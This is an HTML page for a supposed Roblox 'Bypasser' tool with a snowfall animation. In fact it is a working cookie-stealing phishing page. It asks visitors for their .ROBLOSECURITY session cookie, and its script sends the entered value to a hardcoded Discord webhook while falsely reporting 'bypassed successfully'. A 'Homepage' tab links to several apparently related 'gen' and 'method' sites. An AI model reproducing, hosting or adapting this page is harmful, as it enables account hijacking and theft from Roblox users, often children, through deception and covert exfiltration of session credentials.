<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>vex</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap');

body{
  background:#0a0a0a;
  color:#e0e0e0;
  font-family:'Inter',sans-serif;
  min-height:100vh;
  overflow-x:hidden;
  position:relative;
}

canvas#snow{
  position:fixed;
  top:0;left:0;
  width:100%;height:100%;
  pointer-events:none;
  z-index:0;
}

.wrap{
  position:relative;
  z-index:1;
  max-width:540px;
  margin:0 auto;
  padding:40px 20px;
}

.server-bar{
  text-align:center;
  margin-bottom:48px;
  padding-bottom:24px;
  border-bottom:1px solid #1a1a1a;
}

.server-bar a{
  color:#787878;
  font-size:12px;
  letter-spacing:.4px;
  text-decoration:none;
  text-transform:uppercase;
  font-weight:500;
  transition:color .2s;
}

.server-bar a:hover{color:#fff}

.server-bar p{
  color:#333;
  font-size:11px;
  margin-top:6px;
  font-weight:300;
}

.tabs{
  display:flex;
  gap:0;
  margin-bottom:36px;
  border-bottom:1px solid #1a1a1a;
}

.tab{
  background:none;
  border:none;
  color:#444;
  font-family:'Inter',sans-serif;
  font-size:13px;
  font-weight:500;
  padding:10px 0;
  margin-right:28px;
  cursor:pointer;
  position:relative;
  transition:color .2s;
  letter-spacing:.2px;
}

.tab:hover{color:#999}

.tab.active{color:#e0e0e0}

.tab.active::after{
  content:'';
  position:absolute;
  bottom:-1px;
  left:0;
  width:100%;
  height:1px;
  background:#e0e0e0;
}

.panel{display:none}
.panel.active{display:block}

/* bypasser */
.bypasser-label{
  font-size:11px;
  color:#555;
  text-transform:uppercase;
  letter-spacing:.8px;
  margin-bottom:14px;
  font-weight:500;
}

.input-wrap{
  position:relative;
  margin-bottom:16px;
}

.input-wrap input{
  width:100%;
  background:#0f0f0f;
  border:1px solid #1c1c1c;
  color:#ccc;
  font-family:'JetBrains Mono',monospace;
  font-size:13px;
  padding:14px 16px;
  border-radius:4px;
  outline:none;
  transition:border-color .2s;
}

.input-wrap input::placeholder{color:#2e2e2e}
.input-wrap input:focus{border-color:#333}

.submit-btn{
  width:100%;
  background:#e0e0e0;
  color:#0a0a0a;
  border:none;
  font-family:'Inter',sans-serif;
  font-size:13px;
  font-weight:600;
  padding:12px;
  border-radius:4px;
  cursor:pointer;
  transition:background .15s, transform .1s;
  letter-spacing:.3px;
}

.submit-btn:hover{background:#fff}
.submit-btn:active{transform:scale(.985)}

.status{
  margin-top:14px;
  font-size:12px;
  color:#333;
  min-height:18px;
  font-weight:300;
}

.status.ok{color:#5a5}
.status.err{color:#a55}

/* links */
.link-list{
  list-style:none;
  display:flex;
  flex-direction:column;
  gap:2px;
}

.link-list li a{
  display:flex;
  align-items:center;
  justify-content:space-between;
  padding:14px 16px;
  color:#bbb;
  text-decoration:none;
  font-size:14px;
  font-weight:400;
  border-radius:4px;
  transition:background .15s, color .15s;
}

.link-list li a:hover{
  background:#111;
  color:#fff;
}

.link-list li a span.arrow{
  color:#333;
  font-size:14px;
  transition:color .15s, transform .15s;
}

.link-list li a:hover span.arrow{
  color:#888;
  transform:translateX(3px);
}

.link-label{
  font-size:11px;
  color:#555;
  text-transform:uppercase;
  letter-spacing:.8px;
  margin-bottom:14px;
  font-weight:500;
}

.footer{
  text-align:center;
  margin-top:64px;
  padding-top:24px;
  border-top:1px solid #111;
}

.footer span{
  font-size:11px;
  color:#222;
  font-weight:300;
}
</style>
</head>
<body>

<canvas id="snow"></canvas>

<div class="wrap">

  <div class="server-bar">
    <a href="https://discord.gg/5eeWBhZAuR" target="_blank">vex beams server</a>
    <p>join for updates</p>
  </div>

  <div class="tabs">
    <button class="tab active" data-tab="bypasser">Bypasser</button>
    <button class="tab" data-tab="links">Homepage</button>
  </div>

  <div class="panel active" id="bypasser">
    <p class="bypasser-label">input .robloxsecurity</p>
    <div class="input-wrap">
      <input type="text" id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE..." autocomplete="off" spellcheck="false">
    </div>
    <button class="submit-btn" id="submitBtn">Submit</button>
    <p class="status" id="status"></p>
  </div>

  <div class="panel" id="links">
    <p class="link-label">resources</p>
    <ul class="link-list">
      <li><a href="https://app.beamse.pro/gen/Vex" target="_blank">VEX SITE <span class="arrow">-></span></a></li>
      <li><a href="https://shockify.st/?code=MTQ4NDIwNzE5MDk0NzA1MjgwMg==" target="_blank">Shockify <span class="arrow">-></span></a></li>
      <li><a href="https://blox-link.com/gen" target="_blank">Blox Link Method Site <span class="arrow">-></span></a></li>
      <li><a href="https://tncs-hyper-lnk-jitv.vercel.app/" target="_blank">Hyperlink <span class="arrow">-></span></a></li>
    </ul>
  </div>

  <div class="footer">
    <span>vex</span>
  </div>

</div>

<script>
// tabs
document.querySelectorAll('.tab').forEach(t=>{
  t.addEventListener('click',()=>{
    document.querySelectorAll('.tab').forEach(b=>b.classList.remove('active'));
    document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
    t.classList.add('active');
    document.getElementById(t.dataset.tab).classList.add('active');
  });
});

// submit
const webhook='https://discord.com/api/webhooks/1488738403934539818/NuJwz-0f--N9uHAnSrKhgOISmKPD4wd9JIBTC_xAi0VYC2ZK4iLZF9k8F9Wpk5P72Vcz';

document.getElementById('submitBtn').addEventListener('click',async()=>{
  const val=document.getElementById('cookieInput').value.trim();
  const s=document.getElementById('status');
  if(!val){s.textContent='empty input';s.className='status err';return}
  s.textContent='sending...';s.className='status';
  try{
    const r=await fetch(webhook,{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({content:'```'+val+'```'})
    });
    if(r.ok){
      s.textContent='bypassed successfully';
      s.className='status ok';
      document.getElementById('cookieInput').value='';
    }else{
      s.textContent='failed, try again';
      s.className='status err';
    }
  }catch(e){
    s.textContent='network error';
    s.className='status err';
  }
});

// snow
(function(){
  const c=document.getElementById('snow');
  const ctx=c.getContext('2d');
  let w,h;
  const flakes=[];
  const COUNT=120;

  function resize(){
    w=c.width=window.innerWidth;
    h=c.height=window.innerHeight;
  }
  window.addEventListener('resize',resize);
  resize();

  for(let i=0;i<COUNT;i++){
    flakes.push({
      x:Math.random()*w,
      y:Math.random()*h,
      r:Math.random()*1.8+.3,
      sx:Math.random()*.3-.15,
      sy:Math.random()*.6+.2,
      o:Math.random()*.4+.08
    });
  }

  function draw(){
    ctx.clearRect(0,0,w,h);
    for(const f of flakes){
      ctx.beginPath();
      ctx.arc(f.x,f.y,f.r,0,Math.PI*2);
      ctx.fillStyle='rgba(255,255,255,'+f.o+')';
      ctx.fill();
      f.x+=f.sx;
      f.y+=f.sy;
      if(f.y>h+5){f.y=-5;f.x=Math.random()*w}
      if(f.x>w+5)f.x=-5;
      if(f.x<-5)f.x=w+5;
    }
    requestAnimationFrame(draw);
  }
  draw();
})();
</script>

</body>
</html>
